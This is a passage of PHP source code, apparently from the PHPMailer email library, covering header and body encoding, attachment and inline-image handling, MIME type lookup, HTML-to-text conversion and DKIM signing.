            $file_buffer = $this->encodeString($file_buffer, $encoding);
            if ($magic_quotes) {
                if (version_compare(PHP_VERSION, '5.3.0', '<')) {
                    set_magic_quotes_runtime($magic_quotes);
                } else {
                    ini_set('magic_quotes_runtime', $magic_quotes);
                }
            }
            return $file_buffer;
        } catch (Exception $exc) {
            $this->setError($exc->getMessage());
            return '';
        }
    }

    /**
     * Encode a string in requested format.
     * Returns an empty string on failure.
     * @param string $str The text to encode
     * @param string $encoding The encoding to use; one of 'base64', '7bit', '8bit', 'binary', 'quoted-printable'
     * @access public
     * @return string
     */
    public function encodeString($str, $encoding = 'base64')
    {
        $encoded = '';
        switch (strtolower($encoding)) {
            case 'base64':
                $encoded = chunk_split(base64_encode($str), 76, $this->LE);
                break;
            case '7bit':
            case '8bit':
                $encoded = $this->fixEOL($str);
                // Make sure it ends with a line break
                if (substr($encoded, -(strlen($this->LE))) != $this->LE) {
                    $encoded .= $this->LE;
                }
                break;
            case 'binary':
                $encoded = $str;
                break;
            case 'quoted-printable':
                $encoded = $this->encodeQP($str);
                break;
            default:
                $this->setError($this->lang('encoding') . $encoding);
                break;
        }
        return $encoded;
    }

    /**
     * Encode a header string optimally.
     * Picks shortest of Q, B, quoted-printable or none.
     * @access public
     * @param string $str
     * @param string $position
     * @return string
     */
    public function encodeHeader($str, $position = 'text')
    {
        $matchcount = 0;
        switch (strtolower($position)) {
            case 'phrase':
                if (!preg_match('/[\200-\377]/', $str)) {
                    // Can't use addslashes as we don't know the value of magic_quotes_sybase
                    $encoded = addcslashes($str, "\0..\37\177\\\"");
                    if (($str == $encoded) && !preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/', $str)) {
                        return ($encoded);
                    } else {
                        return ("\"$encoded\"");
                    }
                }
                $matchcount = preg_match_all('/[^\040\041\043-\133\135-\176]/', $str, $matches);
                break;
            /** @noinspection PhpMissingBreakStatementInspection */
            case 'comment':
                $matchcount = preg_match_all('/[()"]/', $str, $matches);
                // Intentional fall-through
            case 'text':
            default:
                $matchcount += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/', $str, $matches);
                break;
        }

        //There are no chars that need encoding
        if ($matchcount == 0) {
            return ($str);
        }

        $maxlen = 75 - 7 - strlen($this->CharSet);
        // Try to select the encoding which should produce the shortest output
        if ($matchcount > strlen($str) / 3) {
            // More than a third of the content will need encoding, so B encoding will be most efficient
            $encoding = 'B';
            if (function_exists('mb_strlen') && $this->hasMultiBytes($str)) {
                // Use a custom function which correctly encodes and wraps long
                // multibyte strings without breaking lines within a character
                $encoded = $this->base64EncodeWrapMB($str, "\n");
            } else {
                $encoded = base64_encode($str);
                $maxlen -= $maxlen % 4;
                $encoded = trim(chunk_split($encoded, $maxlen, "\n"));
            }
        } else {
            $encoding = 'Q';
            $encoded = $this->encodeQ($str, $position);
            $encoded = $this->wrapText($encoded, $maxlen, true);
            $encoded = str_replace('=' . self::CRLF, "\n", trim($encoded));
        }

        $encoded = preg_replace('/^(.*)$/m', ' =?' . $this->CharSet . "?$encoding?\\1?=", $encoded);
        $encoded = trim(str_replace("\n", $this->LE, $encoded));

        return $encoded;
    }

    /**
     * Check if a string contains multi-byte characters.
     * @access public
     * @param string $str multi-byte text to wrap encode
     * @return boolean
     */
    public function hasMultiBytes($str)
    {
        if (function_exists('mb_strlen')) {
            return (strlen($str) > mb_strlen($str, $this->CharSet));
        } else { // Assume no multibytes (we can't handle without mbstring functions anyway)
            return false;
        }
    }

    /**
     * Does a string contain any 8-bit chars (in any charset)?
     * @param string $text
     * @return boolean
     */
    public function has8bitChars($text)
    {
        return (boolean)preg_match('/[\x80-\xFF]/', $text);
    }

    /**
     * Encode and wrap long multibyte strings for mail headers
     * without breaking lines within a character.
     * Adapted from a function by paravoid
     * @link http://www.php.net/manual/en/function.mb-encode-mimeheader.php#60283
     * @access public
     * @param string $str multi-byte text to wrap encode
     * @param string $linebreak string to use as linefeed/end-of-line
     * @return string
     */
    public function base64EncodeWrapMB($str, $linebreak = null)
    {
        $start = '=?' . $this->CharSet . '?B?';
        $end = '?=';
        $encoded = '';
        if ($linebreak === null) {
            $linebreak = $this->LE;
        }

        $mb_length = mb_strlen($str, $this->CharSet);
        // Each line must have length <= 75, including $start and $end
        $length = 75 - strlen($start) - strlen($end);
        // Average multi-byte ratio
        $ratio = $mb_length / strlen($str);
        // Base64 has a 4:3 ratio
        $avgLength = floor($length * $ratio * .75);

        for ($i = 0; $i < $mb_length; $i += $offset) {
            $lookBack = 0;
            do {
                $offset = $avgLength - $lookBack;
                $chunk = mb_substr($str, $i, $offset, $this->CharSet);
                $chunk = base64_encode($chunk);
                $lookBack++;
            } while (strlen($chunk) > $length);
            $encoded .= $chunk . $linebreak;
        }

        // Chomp the last linefeed
        $encoded = substr($encoded, 0, -strlen($linebreak));
        return $encoded;
    }

    /**
     * Encode a string in quoted-printable format.
     * According to RFC2045 section 6.7.
     * @access public
     * @param string $string The text to encode
     * @param integer $line_max Number of chars allowed on a line before wrapping
     * @return string
     * @link http://www.php.net/manual/en/function.quoted-printable-decode.php#89417 Adapted from this comment
     */
    public function encodeQP($string, $line_max = 76)
    {
        // Use native function if it's available (>= PHP5.3)
        if (function_exists('quoted_printable_encode')) {
            return $this->fixEOL(quoted_printable_encode($string));
        }
        // Fall back to a pure PHP implementation
        $string = str_replace(
            array('%20', '%0D%0A.', '%0D%0A', '%'),
            array(' ', "\r\n=2E", "\r\n", '='),
            rawurlencode($string)
        );
        $string = preg_replace('/[^\r\n]{' . ($line_max - 3) . '}[^=\r\n]{2}/', "$0=\r\n", $string);
        return $this->fixEOL($string);
    }

    /**
     * Backward compatibility wrapper for an old QP encoding function that was removed.
     * @see PHPMailer::encodeQP()
     * @access public
     * @param string $string
     * @param integer $line_max
     * @param boolean $space_conv
     * @return string
     * @deprecated Use encodeQP instead.
     */
    public function encodeQPphp(
        $string,
        $line_max = 76,
        /** @noinspection PhpUnusedParameterInspection */ $space_conv = false
    ) {
        return $this->encodeQP($string, $line_max);
    }

    /**
     * Encode a string using Q encoding.
     * @link http://tools.ietf.org/html/rfc2047
     * @param string $str the text to encode
     * @param string $position Where the text is going to be used, see the RFC for what that means
     * @access public
     * @return string
     */
    public function encodeQ($str, $position = 'text')
    {
        // There should not be any EOL in the string
        $pattern = '';
        $encoded = str_replace(array("\r", "\n"), '', $str);
        switch (strtolower($position)) {
            case 'phrase':
                // RFC 2047 section 5.3
                $pattern = '^A-Za-z0-9!*+\/ -';
                break;
            /** @noinspection PhpMissingBreakStatementInspection */
            case 'comment':
                // RFC 2047 section 5.2
                $pattern = '\(\)"';
                // intentional fall-through
                // for this reason we build the $pattern without including delimiters and []
            case 'text':
            default:
                // RFC 2047 section 5.1
                // Replace every high ascii, control, =, ? and _ characters
                $pattern = '\000-\011\013\014\016-\037\075\077\137\177-\377' . $pattern;
                break;
        }
        $matches = array();
        if (preg_match_all("/[{$pattern}]/", $encoded, $matches)) {
            // If the string contains an '=', make sure it's the first thing we replace
            // so as to avoid double-encoding
            $eqkey = array_search('=', $matches[0]);
            if (false !== $eqkey) {
                unset($matches[0][$eqkey]);
                array_unshift($matches[0], '=');
            }
            foreach (array_unique($matches[0]) as $char) {
                $encoded = str_replace($char, '=' . sprintf('%02X', ord($char)), $encoded);
            }
        }
        // Replace every spaces to _ (more readable than =20)
        return str_replace(' ', '_', $encoded);
    }


    /**
     * Add a string or binary attachment (non-filesystem).
     * This method can be used to attach ascii or binary data,
     * such as a BLOB record from a database.
     * @param string $string String attachment data.
     * @param string $filename Name of the attachment.
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type File extension (MIME) type.
     * @param string $disposition Disposition to use
     * @return void
     */
    public function addStringAttachment(
        $string,
        $filename,
        $encoding = 'base64',
        $type = '',
        $disposition = 'attachment'
    ) {
        // If a MIME type is not specified, try to work it out from the file name
        if ($type == '') {
            $type = self::filenameToType($filename);
        }
        // Append to $attachment array
        $this->attachment[] = array(
            0 => $string,
            1 => $filename,
            2 => basename($filename),
            3 => $encoding,
            4 => $type,
            5 => true, // isStringAttachment
            6 => $disposition,
            7 => 0
        );
    }

    /**
     * Add an embedded (inline) attachment from a file.
     * This can include images, sounds, and just about any other document type.
     * These differ from 'regular' attachments in that they are intended to be
     * displayed inline with the message, not just attached for download.
     * This is used in HTML messages that embed the images
     * the HTML refers to using the $cid value.
     * @param string $path Path to the attachment.
     * @param string $cid Content ID of the attachment; Use this to reference
     *        the content when using an embedded image in HTML.
     * @param string $name Overrides the attachment name.
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type File MIME type.
     * @param string $disposition Disposition to use
     * @return boolean True on successfully adding an attachment
     */
    public function addEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = '', $disposition = 'inline')
    {
        if (!@is_file($path)) {
            $this->setError($this->lang('file_access') . $path);
            return false;
        }

        // If a MIME type is not specified, try to work it out from the file name
        if ($type == '') {
            $type = self::filenameToType($path);
        }

        $filename = basename($path);
        if ($name == '') {
            $name = $filename;
        }

        // Append to $attachment array
        $this->attachment[] = array(
            0 => $path,
            1 => $filename,
            2 => $name,
            3 => $encoding,
            4 => $type,
            5 => false, // isStringAttachment
            6 => $disposition,
            7 => $cid
        );
        return true;
    }

    /**
     * Add an embedded stringified attachment.
     * This can include images, sounds, and just about any other document type.
     * Be sure to set the $type to an image type for images:
     * JPEG images use 'image/jpeg', GIF uses 'image/gif', PNG uses 'image/png'.
     * @param string $string The attachment binary data.
     * @param string $cid Content ID of the attachment; Use this to reference
     *        the content when using an embedded image in HTML.
     * @param string $name
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type MIME type.
     * @param string $disposition Disposition to use
     * @return boolean True on successfully adding an attachment
     */
    public function addStringEmbeddedImage(
        $string,
        $cid,
        $name = '',
        $encoding = 'base64',
        $type = '',
        $disposition = 'inline'
    ) {
        // If a MIME type is not specified, try to work it out from the name
        if ($type == '') {
            $type = self::filenameToType($name);
        }

        // Append to $attachment array
        $this->attachment[] = array(
            0 => $string,
            1 => $name,
            2 => $name,
            3 => $encoding,
            4 => $type,
            5 => true, // isStringAttachment
            6 => $disposition,
            7 => $cid
        );
        return true;
    }

    /**
     * Check if an inline attachment is present.
     * @access public
     * @return boolean
     */
    public function inlineImageExists()
    {
        foreach ($this->attachment as $attachment) {
            if ($attachment[6] == 'inline') {
                return true;
            }
        }
        return false;
    }

    /**
     * Check if an attachment (non-inline) is present.
     * @return boolean
     */
    public function attachmentExists()
    {
        foreach ($this->attachment as $attachment) {
            if ($attachment[6] == 'attachment') {
                return true;
            }
        }
        return false;
    }

    /**
     * Check if this message has an alternative body set.
     * @return boolean
     */
    public function alternativeExists()
    {
        return !empty($this->AltBody);
    }

    /**
     * Clear all To recipients.
     * @return void
     */
    public function clearAddresses()
    {
        foreach ($this->to as $to) {
            unset($this->all_recipients[strtolower($to[0])]);
        }
        $this->to = array();
    }

    /**
     * Clear all CC recipients.
     * @return void
     */
    public function clearCCs()
    {
        foreach ($this->cc as $cc) {
            unset($this->all_recipients[strtolower($cc[0])]);
        }
        $this->cc = array();
    }

    /**
     * Clear all BCC recipients.
     * @return void
     */
    public function clearBCCs()
    {
        foreach ($this->bcc as $bcc) {
            unset($this->all_recipients[strtolower($bcc[0])]);
        }
        $this->bcc = array();
    }

    /**
     * Clear all ReplyTo recipients.
     * @return void
     */
    public function clearReplyTos()
    {
        $this->ReplyTo = array();
    }

    /**
     * Clear all recipient types.
     * @return void
     */
    public function clearAllRecipients()
    {
        $this->to = array();
        $this->cc = array();
        $this->bcc = array();
        $this->all_recipients = array();
    }

    /**
     * Clear all filesystem, string, and binary attachments.
     * @return void
     */
    public function clearAttachments()
    {
        $this->attachment = array();
    }

    /**
     * Clear all custom headers.
     * @return void
     */
    public function clearCustomHeaders()
    {
        $this->CustomHeader = array();
    }

    /**
     * Add an error message to the error container.
     * @access protected
     * @param string $msg
     * @return void
     */
    protected function setError($msg)
    {
        $this->error_count++;
        if ($this->Mailer == 'smtp' and !is_null($this->smtp)) {
            $lasterror = $this->smtp->getError();
            if (!empty($lasterror['error'])) {
                $msg .= $this->lang('smtp_error') . $lasterror['error'];
                if (!empty($lasterror['detail'])) {
                    $msg .= ' Detail: '. $lasterror['detail'];
                }
                if (!empty($lasterror['smtp_code'])) {
                    $msg .= ' SMTP code: ' . $lasterror['smtp_code'];
                }
                if (!empty($lasterror['smtp_code_ex'])) {
                    $msg .= ' Additional SMTP info: ' . $lasterror['smtp_code_ex'];
                }
            }
        }
        $this->ErrorInfo = $msg;
    }

    /**
     * Return an RFC 822 formatted date.
     * @access public
     * @return string
     * @static
     */
    public static function rfcDate()
    {
        // Set the time zone to whatever the default is to avoid 500 errors
        // Will default to UTC if it's not set properly in php.ini
        date_default_timezone_set(@date_default_timezone_get());
        return date('D, j M Y H:i:s O');
    }

    /**
     * Get the server hostname.
     * Returns 'localhost.localdomain' if unknown.
     * @access protected
     * @return string
     */
    protected function serverHostname()
    {
        $result = 'localhost.localdomain';
        if (!empty($this->Hostname)) {
            $result = $this->Hostname;
        } elseif (isset($_SERVER) and array_key_exists('SERVER_NAME', $_SERVER) and !empty($_SERVER['SERVER_NAME'])) {
            $result = $_SERVER['SERVER_NAME'];
        } elseif (function_exists('gethostname') && gethostname() !== false) {
            $result = gethostname();
        } elseif (php_uname('n') !== false) {
            $result = php_uname('n');
        }
        return $result;
    }

    /**
     * Get an error message in the current language.
     * @access protected
     * @param string $key
     * @return string
     */
    protected function lang($key)
    {
        if (count($this->language) < 1) {
            $this->setLanguage('en'); // set the default language
        }

        if (array_key_exists($key, $this->language)) {
            if ($key == 'smtp_connect_failed') {
                //Include a link to troubleshooting docs on SMTP connection failure
                //this is by far the biggest cause of support questions
                //but it's usually not PHPMailer's fault.
                return $this->language[$key] . ' https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting';
            }
            return $this->language[$key];
        } else {
            //Return the key as a fallback
            return $key;
        }
    }

    /**
     * Check if an error occurred.
     * @access public
     * @return boolean True if an error did occur.
     */
    public function isError()
    {
        return ($this->error_count > 0);
    }

    /**
     * Ensure consistent line endings in a string.
     * Changes every end of line from CRLF, CR or LF to $this->LE.
     * @access public
     * @param string $str String to fixEOL
     * @return string
     */
    public function fixEOL($str)
    {
        // Normalise to \n
        $nstr = str_replace(array("\r\n", "\r"), "\n", $str);
        // Now convert LE as needed
        if ($this->LE !== "\n") {
            $nstr = str_replace("\n", $this->LE, $nstr);
        }
        return $nstr;
    }

    /**
     * Add a custom header.
     * $name value can be overloaded to contain
     * both header name and value (name:value)
     * @access public
     * @param string $name Custom header name
     * @param string $value Header value
     * @return void
     */
    public function addCustomHeader($name, $value = null)
    {
        if ($value === null) {
            // Value passed in as name:value
            $this->CustomHeader[] = explode(':', $name, 2);
        } else {
            $this->CustomHeader[] = array($name, $value);
        }
    }

    /**
     * Returns all custom headers
     *
     * @return array
     */
    public function getCustomHeaders()
    {
        return $this->CustomHeader;
    }

    /**
     * Create a message from an HTML string.
     * Automatically makes modifications for inline images and backgrounds
     * and creates a plain-text version by converting the HTML.
     * Overwrites any existing values in $this->Body and $this->AltBody
     * @access public
     * @param string $message HTML message string
     * @param string $basedir baseline directory for path
     * @param boolean|callable $advanced Whether to use the internal HTML to text converter
     *    or your own custom converter @see html2text()
     * @return string $message
     */
    public function msgHTML($message, $basedir = '', $advanced = false)
    {
        preg_match_all('/(src|background)=["\'](.*)["\']/Ui', $message, $images);
        if (isset($images[2])) {
            foreach ($images[2] as $imgindex => $url) {
                // Convert data URIs into embedded images
                if (preg_match('#^data:(image[^;,]*)(;base64)?,#', $url, $match)) {
                    $data = substr($url, strpos($url, ','));
                    if ($match[2]) {
                        $data = base64_decode($data);
                    } else {
                        $data = rawurldecode($data);
                    }
                    $cid = md5($url) . '@phpmailer.0'; // RFC2392 S 2
                    if ($this->addStringEmbeddedImage($data, $cid, '', 'base64', $match[1])) {
                        $message = str_replace(
                            $images[0][$imgindex],
                            $images[1][$imgindex] . '="cid:' . $cid . '"',
                            $message
                        );
                    }
                } elseif (!preg_match('#^[A-z]+://#', $url)) {
                    // Do not change urls for absolute images (thanks to corvuscorax)
                    $filename = basename($url);
                    $directory = dirname($url);
                    if ($directory == '.') {
                        $directory = '';
                    }
                    $cid = md5($url) . '@phpmailer.0'; // RFC2392 S 2
                    if (strlen($basedir) > 1 && substr($basedir, -1) != '/') {
                        $basedir .= '/';
                    }
                    if (strlen($directory) > 1 && substr($directory, -1) != '/') {
                        $directory .= '/';
                    }
                    if ($this->addEmbeddedImage(
                        $basedir . $directory . $filename,
                        $cid,
                        $filename,
                        'base64',
                        self::_mime_types((string)self::mb_pathinfo($filename, PATHINFO_EXTENSION))
                    )
                    ) {
                        $message = preg_replace(
                            '/' . $images[1][$imgindex] . '=["\']' . preg_quote($url, '/') . '["\']/Ui',
                            $images[1][$imgindex] . '="cid:' . $cid . '"',
                            $message
                        );
                    }
                }
            }
        }
        $this->isHTML(true);
        // Convert all message body line breaks to CRLF, makes quoted-printable encoding work much better
        $this->Body = $this->normalizeBreaks($message);
        $this->AltBody = $this->normalizeBreaks($this->html2text($message, $advanced));
        if (empty($this->AltBody)) {
            $this->AltBody = 'To view this email message, open it in a program that understands HTML!' .
                self::CRLF . self::CRLF;
        }
        return $this->Body;
    }

    /**
     * Convert an HTML string into plain text.
     * This is used by msgHTML().
     * Note - older versions of this function used a bundled advanced converter
     * which was been removed for license reasons in #232
     * Example usage:
     * <code>
     * // Use default conversion
     * $plain = $mail->html2text($html);
     * // Use your own custom converter
     * $plain = $mail->html2text($html, function($html) {
     *     $converter = new MyHtml2text($html);
     *     return $converter->get_text();
     * });
     * </code>
     * @param string $html The HTML text to convert
     * @param boolean|callable $advanced Any boolean value to use the internal converter,
     *   or provide your own callable for custom conversion.
     * @return string
     */
    public function html2text($html, $advanced = false)
    {
        if (is_callable($advanced)) {
            return call_user_func($advanced, $html);
        }
        return html_entity_decode(
            trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/si', '', $html))),
            ENT_QUOTES,
            $this->CharSet
        );
    }

    /**
     * Get the MIME type for a file extension.
     * @param string $ext File extension
     * @access public
     * @return string MIME type of file.
     * @static
     */
    public static function _mime_types($ext = '')
    {
        $mimes = array(
            'xl'    => 'application/excel',
            'js'    => 'application/javascript',
            'hqx'   => 'application/mac-binhex40',
            'cpt'   => 'application/mac-compactpro',
            'bin'   => 'application/macbinary',
            'doc'   => 'application/msword',
            'word'  => 'application/msword',
            'class' => 'application/octet-stream',
            'dll'   => 'application/octet-stream',
            'dms'   => 'application/octet-stream',
            'exe'   => 'application/octet-stream',
            'lha'   => 'application/octet-stream',
            'lzh'   => 'application/octet-stream',
            'psd'   => 'application/octet-stream',
            'sea'   => 'application/octet-stream',
            'so'    => 'application/octet-stream',
            'oda'   => 'application/oda',
            'pdf'   => 'application/pdf',
            'ai'    => 'application/postscript',
            'eps'   => 'application/postscript',
            'ps'    => 'application/postscript',
            'smi'   => 'application/smil',
            'smil'  => 'application/smil',
            'mif'   => 'application/vnd.mif',
            'xls'   => 'application/vnd.ms-excel',
            'ppt'   => 'application/vnd.ms-powerpoint',
            'wbxml' => 'application/vnd.wap.wbxml',
            'wmlc'  => 'application/vnd.wap.wmlc',
            'dcr'   => 'application/x-director',
            'dir'   => 'application/x-director',
            'dxr'   => 'application/x-director',
            'dvi'   => 'application/x-dvi',
            'gtar'  => 'application/x-gtar',
            'php3'  => 'application/x-httpd-php',
            'php4'  => 'application/x-httpd-php',
            'php'   => 'application/x-httpd-php',
            'phtml' => 'application/x-httpd-php',
            'phps'  => 'application/x-httpd-php-source',
            'swf'   => 'application/x-shockwave-flash',
            'sit'   => 'application/x-stuffit',
            'tar'   => 'application/x-tar',
            'tgz'   => 'application/x-tar',
            'xht'   => 'application/xhtml+xml',
            'xhtml' => 'application/xhtml+xml',
            'zip'   => 'application/zip',
            'mid'   => 'audio/midi',
            'midi'  => 'audio/midi',
            'mp2'   => 'audio/mpeg',
            'mp3'   => 'audio/mpeg',
            'mpga'  => 'audio/mpeg',
            'aif'   => 'audio/x-aiff',
            'aifc'  => 'audio/x-aiff',
            'aiff'  => 'audio/x-aiff',
            'ram'   => 'audio/x-pn-realaudio',
            'rm'    => 'audio/x-pn-realaudio',
            'rpm'   => 'audio/x-pn-realaudio-plugin',
            'ra'    => 'audio/x-realaudio',
            'wav'   => 'audio/x-wav',
            'bmp'   => 'image/bmp',
            'gif'   => 'image/gif',
            'jpeg'  => 'image/jpeg',
            'jpe'   => 'image/jpeg',
            'jpg'   => 'image/jpeg',
            'png'   => 'image/png',
            'tiff'  => 'image/tiff',
            'tif'   => 'image/tiff',
            'eml'   => 'message/rfc822',
            'css'   => 'text/css',
            'html'  => 'text/html',
            'htm'   => 'text/html',
            'shtml' => 'text/html',
            'log'   => 'text/plain',
            'text'  => 'text/plain',
            'txt'   => 'text/plain',
            'rtx'   => 'text/richtext',
            'rtf'   => 'text/rtf',
            'vcf'   => 'text/vcard',
            'vcard' => 'text/vcard',
            'xml'   => 'text/xml',
            'xsl'   => 'text/xml',
            'mpeg'  => 'video/mpeg',
            'mpe'   => 'video/mpeg',
            'mpg'   => 'video/mpeg',
            'mov'   => 'video/quicktime',
            'qt'    => 'video/quicktime',
            'rv'    => 'video/vnd.rn-realvideo',
            'avi'   => 'video/x-msvideo',
            'movie' => 'video/x-sgi-movie'
        );
        if (array_key_exists(strtolower($ext), $mimes)) {
            return $mimes[strtolower($ext)];
        }
        return 'application/octet-stream';
    }

    /**
     * Map a file name to a MIME type.
     * Defaults to 'application/octet-stream', i.e.. arbitrary binary data.
     * @param string $filename A file name or full path, does not need to exist as a file
     * @return string
     * @static
     */
    public static function filenameToType($filename)
    {
        // In case the path is a URL, strip any query string before getting extension
        $qpos = strpos($filename, '?');
        if (false !== $qpos) {
            $filename = substr($filename, 0, $qpos);
        }
        $pathinfo = self::mb_pathinfo($filename);
        return self::_mime_types($pathinfo['extension']);
    }

    /**
     * Multi-byte-safe pathinfo replacement.
     * Drop-in replacement for pathinfo(), but multibyte-safe, cross-platform-safe, old-version-safe.
     * Works similarly to the one in PHP >= 5.2.0
     * @link http://www.php.net/manual/en/function.pathinfo.php#107461
     * @param string $path A filename or path, does not need to exist as a file
     * @param integer|string $options Either a PATHINFO_* constant,
     *      or a string name to return only the specified piece, allows 'filename' to work on PHP < 5.2
     * @return string|array
     * @static
     */
    public static function mb_pathinfo($path, $options = null)
    {
        $ret = array('dirname' => '', 'basename' => '', 'extension' => '', 'filename' => '');
        $pathinfo = array();
        if (preg_match('%^(.*?)[\\\\/]*(([^/\\\\]*?)(\.([^\.\\\\/]+?)|))[\\\\/\.]*$%im', $path, $pathinfo)) {
            if (array_key_exists(1, $pathinfo)) {
                $ret['dirname'] = $pathinfo[1];
            }
            if (array_key_exists(2, $pathinfo)) {
                $ret['basename'] = $pathinfo[2];
            }
            if (array_key_exists(5, $pathinfo)) {
                $ret['extension'] = $pathinfo[5];
            }
            if (array_key_exists(3, $pathinfo)) {
                $ret['filename'] = $pathinfo[3];
            }
        }
        switch ($options) {
            case PATHINFO_DIRNAME:
            case 'dirname':
                return $ret['dirname'];
            case PATHINFO_BASENAME:
            case 'basename':
                return $ret['basename'];
            case PATHINFO_EXTENSION:
            case 'extension':
                return $ret['extension'];
            case PATHINFO_FILENAME:
            case 'filename':
                return $ret['filename'];
            default:
                return $ret;
        }
    }

    /**
     * Set or reset instance properties.
     * You should avoid this function - it's more verbose, less efficient, more error-prone and
     * harder to debug than setting properties directly.
     * Usage Example:
     * `$mail->set('SMTPSecure', 'tls');`
     *   is the same as:
     * `$mail->SMTPSecure = 'tls';`
     * @access public
     * @param string $name The property name to set
     * @param mixed $value The value to set the property to
     * @return boolean
     * @TODO Should this not be using the __set() magic function?
     */
    public function set($name, $value = '')
    {
        if (property_exists($this, $name)) {
            $this->$name = $value;
            return true;
        } else {
            $this->setError($this->lang('variable_set') . $name);
            return false;
        }
    }

    /**
     * Strip newlines to prevent header injection.
     * @access public
     * @param string $str
     * @return string
     */
    public function secureHeader($str)
    {
        return trim(str_replace(array("\r", "\n"), '', $str));
    }

    /**
     * Normalize line breaks in a string.
     * Converts UNIX LF, Mac CR and Windows CRLF line breaks into a single line break format.
     * Defaults to CRLF (for message bodies) and preserves consecutive breaks.
     * @param string $text
     * @param string $breaktype What kind of line break to use, defaults to CRLF
     * @return string
     * @access public
     * @static
     */
    public static function normalizeBreaks($text, $breaktype = "\r\n")
    {
        return preg_replace('/(\r\n|\r|\n)/ms', $breaktype, $text);
    }


    /**
     * Set the public and private key files and password for S/MIME signing.
     * @access public
     * @param string $cert_filename
     * @param string $key_filename
     * @param string $key_pass Password for private key
     * @param string $extracerts_filename Optional path to chain certificate
     */
    public function sign($cert_filename, $key_filename, $key_pass, $extracerts_filename = '')
    {
        $this->sign_cert_file = $cert_filename;
        $this->sign_key_file = $key_filename;
        $this->sign_key_pass = $key_pass;
        $this->sign_extracerts_file = $extracerts_filename;
    }

    /**
     * Quoted-Printable-encode a DKIM header.
     * @access public
     * @param string $txt
     * @return string
     */
    public function DKIM_QP($txt)
    {
        $line = '';
        for ($i = 0; $i < strlen($txt); $i++) {
            $ord = ord($txt[$i]);
            if (((0x21 <= $ord) && ($ord <= 0x3A)) || $ord == 0x3C || ((0x3E <= $ord) && ($ord <= 0x7E))) {
                $line .= $txt[$i];
            } else {
                $line .= '=' . sprintf('%02X', $ord);
            }
        }
        return $line;
    }

    /**
     * Generate a DKIM signature.
     * @access public
     * @param string $signHeader
     * @throws phpmailerException
     * @return string
     */
    public function DKIM_Sign($signHeader)
    {
        if (!defined('PKCS7_TEXT')) {
            if ($this->exceptions) {
                throw new phpmailerException($this->lang('extension_missing') . 'openssl');
            }
            return '';
        }
        $privKeyStr = file_get_contents($this->DKIM_private);
        if ($this->DKIM_passphrase != '') {
            $privKey = openssl_pkey_get_private($privKeyStr, $this->DKIM_passphrase);
        } else {
            $privKey = $privKeyStr;
        }
        if (openssl_sign($signHeader, $signature, $privKey)) {
            return base64_encode($signature);
        }
        return '';
    }

    /**
     * Generate a DKIM canonicalization header.
     * @access public
     * @param string $signHeader Header
     * @return string
     */
    public function DKIM_HeaderC($signHeader)
    {
        $signHeader = preg_replace('/\r\n\s+/', ' ', $signHeader);
        $lines = explode("\r\n", $signHeader);
        foreach ($lines as $key => $line) {
            list($heading, $value) = explode(':', $line, 2);
            $heading = strtolower($heading);
            $value = preg_replace('/\s+/', ' ', $value); // Compress useless spaces
            $lines[$key] = $heading . ':' . trim($value); // Don't forget to remove WSP around the value
        }
        $signHeader = implode("\r\n", $lines);
        return $signHeader;
    }

    /**
     * Generate a DKIM canonicalization body.
     * @access public
     * @param string $body Message Body
     * @return string
     */
    public function DKIM_BodyC($body)
    {
        if ($body == '') {
            return "\r\n";
        }
        // stabilize line endings
        $body = str_replace("\r\n", "\n", $body);
        $body = str_replace("\n", "\r\n", $body);
        // END stabilize line endings
        while (substr($body, strlen($body) - 4, 4) == "\r\n\r\n") {
            $body = substr($body, 0, strlen($body) - 2);
        }
        return $body;
    }

    /**
     * Create the DKIM header and body in a new message header.
     * @access public
     * @param string $headers_line Header lines
     * @param string $subject Subject
     * @param string $body Body
     * @return string
     */
    public function DKIM_Add($headers_line, $subject, $body)
    {
        $DKIMsignatureType = 'rsa-sha1'; // Signature & hash algorithms
        $DKIMcanonicalization = 'relaxed/simple'; // Canonicalization of header/body
        $DKIMquery = 'dns/txt'; // Query method
        $DKIMtime = time(); // Signature Timestamp = seconds since 00:00:00 - Jan 1, 1970 (UTC time zone)
        $subject_header = "Subject: $subject";
        $headers = explode($this->LE, $headers_line);
        $from_header = '';
        $to_header = '';
        $current = '';
        foreach ($headers as $header) {
            if (strpos($header, 'From:') === 0) {
                $from_header = $header;
                $current = 'from_header';
            } elseif (strpos($header, 'To:') === 0) {
                $to_header = $header;
                $current = 'to_header';
            } else {
                if (!empty($$current) && strpos($header, ' =?') === 0) {
                    $$current .= $header;
                } else {
                    $current = '';
                }
            }
        }
        $from = str_replace('|', '=7C', $this->DKIM_QP($from_header));
        $to = str_replace('|', '=7C', $this->DKIM_QP($to_header));
        $subject = str_replace(
            '|',
            '=7C',
            $this->DKIM_QP($subject_header)
        ); // Copied header fields (dkim-quoted-printable)
        $body = $this->DKIM_BodyC($body);
        $DKIMlen = strlen($body); // Length of body
        $DKIMb64 = base64_encode(pack('H*', sha1($body))); // Base64 of packed binary SHA-1 hash of body
        if ('' == $this->DKIM_identity) {
            $ident = '';
        } else {
            $ident = ' i=' . $this->DKIM_identity . ';';
        }
        $dkimhdrs = 'DKIM-Signature: v=1; a=' .
            $DKIMsignatureType . '; q=' .
            $DKIMquery . '; l=' .
            $DKIMlen . '; s=' .
            $this->DKIM_selector .
            ";\r\n" .
            "\tt=" . $DKIMtime . '; c=' . $DKIMcanonicalization . ";\r\n" .
            "\th=From:To:Subject;\r\n" .
            "\td=" . $this->DKIM_domain . ';' . $ident . "\r\n" .
            "\tz=$from\r\n" .
            "\t|$to\r\n" .
            "\t|$subject;\r\n" .
            "\tbh=" . $DKIMb64 . ";\r\n" .
            "\tb=";
        $toSign = $this->DKIM_HeaderC(
            $from_header . "\r\n" . $to_header . "\r\n" . $subject_header . "\r\n" . $dkimhdrs
        );
        $signed = $this->DKIM_Sign($toSign);
        return $dkimhdrs . $signed . "\r\n";
    }

    /**
     * Detect if a string contains a line longer than the maximum line length allowed.
     * @param string $str
     * @return boolean
     * @static
     */
    public static function hasLineLongerThanMax($str)
    {
        //+2 to include CRLF line break for a 1000 total
        return (boolean)preg_match('/^(.{'.(self::MAX_LINE_LENGTH + 2).',})/m', $str);
    }

    /**
